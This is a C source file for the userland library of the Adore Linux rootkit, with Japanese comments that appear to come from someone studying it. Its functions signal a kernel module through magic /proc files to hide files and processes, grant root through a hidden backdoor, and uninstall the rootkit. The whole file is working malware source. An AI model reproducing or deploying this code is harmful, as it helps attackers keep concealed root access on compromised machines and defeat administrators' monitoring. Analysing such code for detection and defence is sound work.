#include <sys/types.h>
#include <sys/stat.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include <errno.h>
#include <fcntl.h>

#include "libinvisible.h"

int getresuid(uid_t *, uid_t *, uid_t *);

#ifdef ADORE_LSM
#define APREFIX "/tmp"
#else
#define APREFIX "/proc"
#endif

#define APREFIX "/proc"

#ifdef linux
adore_t *adore_init()
{
	int fd;
	uid_t r, e, s;
	// retにメモリを割り当てる
	adore_t *ret = calloc(1, sizeof(adore_t));

	// /proc/fgjgggfdを作成
	fd = open(APREFIX"/"ADORE_KEY, O_RDWR|O_CREAT, 0);
	close(fd);
	// /proc/fgfgggfdを削除
	unlink(APREFIX"/"ADORE_KEY);

	// real, effective, saved-set uidを取得
	getresuid(&r, &e, &s);

	// 56,r,e,s出力
	printf("%d,%d,%d,%d\n",CURRENT_ADORE,r,e,s);

	if (s == getuid() && getuid() != CURRENT_ADORE) {
		fprintf(stderr,
		        "Failed to authorize myself. No luck, no adore?\n");
		ret->version = -1;
	} else
		ret->version = s;
	return ret;
}

/* Hide a file
 */
int adore_hidefile(adore_t *a, char *path)
{
	return lchown(path, ELITE_UID, ELITE_GID);
}

/* Unhide a file
 */
int adore_unhidefile(adore_t *a, char *path)
{
	return lchown(path, 0, 0);
}

/* Hide a process with PID pid
 */
int adore_hideproc(adore_t *a, pid_t pid)
{
	char buf[1024];

	if (pid == 0)
		return -1;

	sprintf(buf, APREFIX"/hide-%d", pid);
	close(open(buf, O_RDWR|O_CREAT, 0));
	unlink(buf);
	return 0;
}

/* make visible again */
int adore_unhideproc(adore_t *a, pid_t pid)
{
	char buf[1024];

	if (pid == 0)
		return -1;
	sprintf(buf, APREFIX"/unhide-%d", pid);
	close(open(buf, O_RDWR|O_CREAT, 0));
	unlink(buf);
	return 0;
}

/* permanently remove proc
 */
int adore_removeproc(adore_t *a, pid_t pid)
{
	printf("Not supported in this version.\n");
	return 1;
}

/* use the hidden setuid(0)-like backdoor
 */
int adore_makeroot(adore_t *a)
{
	/* now already handled by adore_init() */
	close(open(APREFIX"/fullprivs", O_RDWR|O_CREAT, 0));
	unlink(APREFIX"/fullprivs");
	if (geteuid() != 0)
		return -1;
	return 0;
}

/* return version number of installed adore
 */
int adore_getvers(adore_t *a)
{
	if (!a)
		return -1;
	return a->version;
}

int adore_free(adore_t *a)
{
	free(a);
	return 0;
}

/* uninstall adore
 */
int adore_uninstall(adore_t *a)
{
	close(open(APREFIX"/uninstall", O_RDWR|O_CREAT, 0));
	return 0;
}

/* disappeared in 0.3 */
int adore_disable_logging(adore_t *a)
{
	return -ENOENT;
}

/* ditto */
int adore_enable_logging(adore_t *a)
{
	return -ENOENT;
}

#else
#error "Not supported architecture (Not Linux)."
#endif /* linux */

